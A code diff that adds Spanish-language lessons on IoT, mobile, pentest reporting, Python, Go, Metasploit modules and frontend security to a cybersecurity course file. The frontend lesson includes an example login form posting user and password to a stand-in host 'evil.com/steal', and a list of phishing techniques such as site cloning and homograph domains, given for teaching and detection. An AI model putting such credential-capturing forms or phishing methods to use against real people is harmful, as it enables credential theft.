@@ -2,7 +2,7 @@ import type { Lesson } from "./types";
 
 // Lecciones extendidas. Cada una pertenece a un módulo (sub: "MX") y se puede
 // renderizar con renderMarkdown() en lib/securities/cybersec/markdown.ts.
-// Cobertura: M1-M48 + M51, M53, M54, M55.
+// Cobertura: los 58 módulos del syllabus (M1-M58).
 export const LESSONS: Lesson[] = [
   {
     id: 1,
@@ -626,6 +626,78 @@ export const LESSONS: Lesson[] = [
       { h: "Shift-Left", c: "🔄 **DevSecOps** integra la seguridad en todo el ciclo de desarrollo, no al final. **Shift-left** = detectar problemas lo más temprano posible (es más barato arreglar un bug en el commit que en producción).\n\nLa seguridad se automatiza dentro del pipeline CI/CD, no es una compuerta manual." },
       { h: "Controles en el Pipeline", c: "🛠️ Capas de testing automatizado:\n→ **SAST** — Analiza el código fuente (Semgrep, SonarQube, CodeQL)\n→ **DAST** — Ataca la app corriendo (OWASP ZAP)\n→ **SCA** — Escanea dependencias por CVEs (Dependabot, Snyk)\n→ **Secrets scanning** — Detecta claves commiteadas (gitleaks, trufflehog)\n→ **IaC scanning** — Terraform/K8s (Checkov, tfsec, KICS)\n→ **Container scanning** (Trivy)\n\nUn hallazgo crítico **falla el build** (quality gate)." },
       { h: "Supply Chain", c: "🔗 La **seguridad de la cadena de suministro** ganó protagonismo tras SolarWinds y Log4Shell:\n→ **SBOM** (Software Bill of Materials) — Inventario de componentes\n→ **Firma de artefactos** (Sigstore/cosign) y verificación\n→ **Provenance / SLSA** — Garantizar de dónde vino el build\n→ Proteger los secretos y permisos del CI/CD (un pipeline comprometido = RCE en prod)\n\n💡 En AlphaLog: el quality-gate de GitHub Actions corre lint + build en cada PR antes de mergear." },
+    ],
+  },
+  {
+    id: 53,
+    title: "IoT y Mobile Security",
+    sub: "M49",
+    dur: "35m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Superficie IoT", c: "📱 Los dispositivos **IoT** (cámaras, routers, sensores) suelen tener seguridad débil: defaults de fábrica, sin actualizaciones, servicios expuestos.\n\n**OWASP IoT Top 10** destaca: passwords débiles/hardcodeadas, servicios de red inseguros, interfaces ecosistema inseguras, falta de updates, componentes obsoletos, privacidad.\n\n💥 La botnet **Mirai** (2016) tumbó medio Internet usando IoT con credenciales por defecto." },
+      { h: "Firmware y Hardware", c: "🔧 **Análisis de firmware:**\n→ **binwalk** — Extrae el filesystem de una imagen de firmware\n→ Buscar credenciales hardcodeadas, claves, binarios con vulns\n→ Emulación (QEMU, FAT) para analizar dinámicamente\n\n🔌 **Hardware hacking:** UART/JTAG para acceso a consola, dump de flash, side-channel.\n📡 **BLE** (Bluetooth Low Energy): sniffing, replay, pairing inseguro." },
+      { h: "Mobile Security", c: "📲 **Android:** las apps son APKs (zip). Decompilás con **jadx** o **apktool** para leer el código (Java/Smali). Buscás: secretos hardcodeados, endpoints, almacenamiento inseguro, falta de cert pinning.\n🍏 **iOS:** más cerrado; testing requiere jailbreak o herramientas como Frida/Objection.\n\n📋 **OWASP Mobile Top 10 / MASVS** guía el testing: almacenamiento inseguro, comunicación insegura, criptografía débil, code tampering, reverse engineering." },
+    ],
+  },
+  {
+    id: 54,
+    title: "Proyecto Final y Carrera",
+    sub: "M50",
+    dur: "30m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Auditoría End-to-End", c: "🎯 Un pentest completo integra todo lo aprendido, en fases:\n1. **Scoping & reglas de engagement** (autorización por escrito)\n2. **Reconocimiento** (OSINT)\n3. **Escaneo y enumeración** (Nmap, servicios)\n4. **Análisis de vulnerabilidades**\n5. **Explotación**\n6. **Post-explotación** (privesc, pivoting)\n7. **Reporte**\n\nLa metodología importa más que las herramientas." },
+      { h: "El Reporte Profesional", c: "📝 El **reporte** es el entregable que paga el cliente. Estructura:\n→ **Resumen ejecutivo** — Para directivos: riesgo de negocio, sin tecnicismos\n→ **Alcance y metodología**\n→ **Hallazgos** — Por severidad, cada uno con: descripción, evidencia (PoC), impacto, CVSS, y **remediación**\n→ **Conclusión y recomendaciones**\n\nUn gran pentester se distingue por reportar claro, no por explotar más." },
+      { h: "Carrera y Certificaciones", c: "🚀 **Ruta sugerida:**\n→ Base: **Security+ / Network+**\n→ Defensa: **CySA+, BTL1**\n→ Ofensiva: **eJPT → PNPT / OSCP**\n→ Avanzado: **OSEP, CRTO, GPEN, CISSP** (management)\n\n🏆 **Portfolio:** writeups de **HackTheBox / TryHackMe**, CTFs, GitHub con tools propias, blog técnico. La experiencia práctica vale tanto como los certificados." },
+    ],
+  },
+  {
+    id: 55,
+    title: "Python Avanzado para Seguridad",
+    sub: "M52",
+    dur: "40m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Parsing y Regex", c: "🐍 Más allá de lo básico, Python brilla procesando datos de seguridad:\n→ **Regex (re)** — Extraer IPs, hashes, emails de logs:\nimport re\nips = re.findall(r'\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+', log)\n→ **File I/O** — Parsear logs grandes línea por línea (memoria eficiente)\n→ **collections.Counter** — Top IPs/eventos en una línea" },
+      { h: "Cripto y APIs", c: "🔐 **cryptography / pycryptodome** — Cifrar/descifrar, hashing, firmas en tus tools.\n\n🌐 **Interacción con APIs de seguridad:**\n→ **VirusTotal** — Reputación de hashes/URLs\n→ **Shodan** — Buscar hosts expuestos\n→ **AbuseIPDB, AlienVault OTX** — Threat intel\n\nimport requests\nr = requests.get(url, headers={'x-apikey': KEY})\ndata = r.json()" },
+      { h: "Building Tools", c: "🛠️ Construir herramientas reales:\n→ **argparse** — CLIs profesionales con flags\n→ **threading / asyncio** — Escaneos concurrentes (rápidos)\n→ **Estructura modular** — Separar lógica, reutilizar\n\n💡 Proyecto integrador: un script que tome una lista de IPs, consulte VirusTotal y Shodan, y genere un reporte HTML automático. Eso es DevSecOps + automatización en acción." },
+    ],
+  },
+  {
+    id: 56,
+    title: "Go para Security Tools",
+    sub: "M56",
+    dur: "30m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Por qué Go", c: "🐹 **Go** se volvió EL lenguaje de las herramientas de seguridad modernas:\n→ **Binarios estáticos** — Un solo ejecutable, sin dependencias (fácil de droppear en un target)\n→ **Cross-compilation** — Compilás para Windows/Linux/Mac desde una sola máquina\n→ **Concurrencia nativa** — Goroutines = escaneos masivos y veloces\n→ Rápido y tipado" },
+      { h: "Concurrencia", c: "⚡ Las **goroutines** y **channels** hacen trivial el trabajo concurrente (ideal para escáneres):\n\nfor _, port := range ports {\n  go func(p int) {\n    if isOpen(host, p) { results <- p }\n  }(port)\n}\n\nMiles de conexiones en paralelo con poco código → mucho más rápido que un loop secuencial." },
+      { h: "Herramientas en Go", c: "🧰 Muchas tools top están escritas en Go:\n→ **nuclei** — Scanner basado en templates\n→ **subfinder / httpx / naabu** (ProjectDiscovery)\n→ **chisel / ligolo-ng** — Pivoting\n→ **gobuster** — Fuzzing de directorios\n→ **trivy** — Container scanning\n\n💡 Su portabilidad y velocidad explican por qué desplazó a Python en muchas herramientas de red." },
+    ],
+  },
+  {
+    id: 57,
+    title: "Ruby y Metasploit Development",
+    sub: "M57",
+    dur: "35m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Ruby para Seguridad", c: "💎 **Ruby** es el lenguaje de **Metasploit**. Saber lo básico te permite leer, modificar y crear módulos.\n\nFundamentos: variables, métodos (def), bloques, clases. Sintaxis expresiva y legible.\n\nMetasploit está escrito en Ruby, por eso extenderlo requiere entenderlo." },
+      { h: "Estructura de un Módulo", c: "🧩 Un módulo de Metasploit hereda de una clase base y define:\n→ **initialize** — Metadata (nombre, descripción, autor, referencias, targets)\n→ **register_options** — Parámetros (RHOSTS, RPORT...)\n→ **run / exploit / check** — La lógica principal\n\nTipos: exploit, auxiliary (scanners/fuzzers), post, payload. Se colocan en el árbol de módulos para que msfconsole los cargue." },
+      { h: "Escribir un Auxiliary", c: "✍️ Un módulo **auxiliary** simple (ej: un scanner) hereda de Msf::Auxiliary::Scanner, define las opciones y un método run_host que prueba algo contra cada objetivo.\n\nFlujo: copiás un módulo existente similar → adaptás metadata y lógica → lo cargás con reload_all → lo probás en un lab.\n\n🎓 Es la puerta de entrada al **exploit development**: empezás leyendo módulos, después modificás, después creás los tuyos." },
+    ],
+  },
+  {
+    id: 58,
+    title: "HTML/CSS y Seguridad Frontend",
+    sub: "M58",
+    dur: "30m",
+    diff: "Intermedio",
+    sections: [
+      { h: "HTML y Formularios", c: "🌐 El **frontend** es lo que ve la víctima — y lo que el phisher imita. HTML estructura la página; los **formularios** capturan datos.\n\n<form action='https://evil.com/steal' method='POST'>\n  <input name='user'>\n  <input name='pass' type='password'>\n</form>\n\nUn form puede enviar datos a CUALQUIER destino → base de las páginas de phishing." },
+      { h: "Validación Client-Side y sus Límites", c: "⚠️ La validación en el navegador (required, pattern, JS) mejora UX pero **NO es seguridad**: el atacante la saltea con DevTools, Burp o curl.\n\n**Regla de oro:** TODA validación de seguridad ocurre en el **servidor**. El cliente nunca es de confianza.\n\nLo mismo con datos ocultos (hidden inputs, precios en el HTML): manipulables → validá en backend." },
+      { h: "Phishing: Crear y Detectar", c: "🎣 Técnicas que usan los phishers:\n→ **Clonar el HTML/CSS** de un sitio real (Save As, HTTrack)\n→ **Homograph attacks** — Dominios con caracteres unicode similares (аpple.com con 'а' cirílica)\n→ **iframe injection / overlay** y trucos de CSS para ocultar la URL real\n\n🔍 **Detectar:** revisar la URL real, certificado, faltas de ortografía, formularios que apuntan a dominios ajenos, y enseñar a los usuarios a desconfiar de la urgencia." },
     ],
   },
 ];
